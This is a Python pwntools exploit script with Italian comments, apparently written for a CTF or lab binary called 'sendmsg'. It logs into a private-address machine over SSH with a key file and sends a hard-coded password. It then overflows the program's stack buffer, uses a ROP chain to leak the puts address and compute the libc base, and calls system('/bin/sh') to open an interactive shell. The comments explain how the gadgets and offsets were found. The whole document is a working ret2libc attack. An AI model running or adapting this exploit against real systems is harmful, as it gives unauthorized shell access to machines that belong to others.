from pwn import *

pty = process.PTY

elf = ELF("./sendmsg")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #locale
libc = ELF("./libc-2.31.so") #della macchina

sshConn = ssh(host='172.16.164.130', user='phil', keyfile='/home/marco/Downloads/1App/mykeys/pubkey')

context.binary = elf

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

func = 0x401216		#Indirizzo della funzione che voglio ripetere (dopo aver leakato)

ret = 0x004013a4 	#Un return per allineare lo stack (ma quando serve?) (Ho messo l'indirizzo dopo pop rdi)

pop_rdi = 0x004013a3	#Indirizzo del gadget pop rdi; ret (trovato con ropper -f sendmsg --search "pop rdi" )

#Self explanatory
sh_offset = next(libc.search(b"/bin/sh"))	
puts_offset = libc.symbols["puts"]		
system_offset = libc.symbols["system"]

exploit = b""
exploit += p64(pop_rdi)		#In RDI ci sono gli argomenti delle funzioni.
exploit += p64(puts_got)	#Quindi col gadget di sopra diamo come argomento l'indirizzo reale di puts
exploit += p64(puts_plt)	#Lo diamo come argomento a puts stesso. Quindi stampiamo l'indirizzo
exploit += p64(func)		#Questo verrà letto dal ret di puts, credo? Comunque mi rimanda alla funzione

gdb_env = {
    "LD_PRELOAD":"/home/marco/Downloads/1App/smash_the_fkn_stack/libc.so.6"
}

# break *0x000000000040125d  per fermare prima di ritornare da receive
commands ='''
unset environment
continue
'''

#p = gdb.debug("./sendmsg",gdbscript=commands,env=gdb_env,stdin=pty,stdout=pty)
p = sshConn.process('sendmsg')

print (p.recv())
p.sendline(b"StrongPsw")

print (p.recv())
#Per trovare l'offset (al quale inizia RIP) uso il pattern create di peda
#gdb-peda > pattern create 512
#poi copio i primi 8 caratteri dallo stack:
#[------------------------------------stack-------------------------------------]
#0000| 0x7ffeeeb946c8 ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%\n")
#			^^^^^^^^
#gdb-peda > pattern offset HA%dA%3A

p.sendline(b"A"* 264 + exploit) 

p.recvuntil(b'\x40\x0a')	#Ricevo l'indirizzo! Con debug (basta mettere come argomento DEBUG a questo script) =
received = p.recvline()		#= controlla il formato. Attento a spazi, \n, e cose varie. Controlla da gdb
#print (b"RAW RECEIVED : " + received)

leak = u64(received[:-1].ljust(8, b"\x00"))	#Il -1 è da variare in base al formato. Ljust lo rende lungo 8 caratteri e aggiunge padding di \x00
print("Puts leak: " + hex(leak))

libc_base = leak - puts_offset			#Ora ho l'indirizzo di libc!

print("Indirizzo libc: ", hex(libc_base))

exploit = b""
exploit += p64(pop_rdi)				#Come su, RDI contiene l'argomento
exploit += p64(libc_base+sh_offset)		#L'argomento in questo caso è /bin/sh
exploit += p64(ret)				#Per allineare lo stack. Credo? Non so quando/se serve
exploit += p64(libc_base+system_offset)		#E la funzione da chiamare è system()

print (hex(libc_base+sh_offset))
print (hex(ret))
print (hex(libc_base+system_offset))

p.sendline(b"A"* 264 + exploit)

p.interactive()
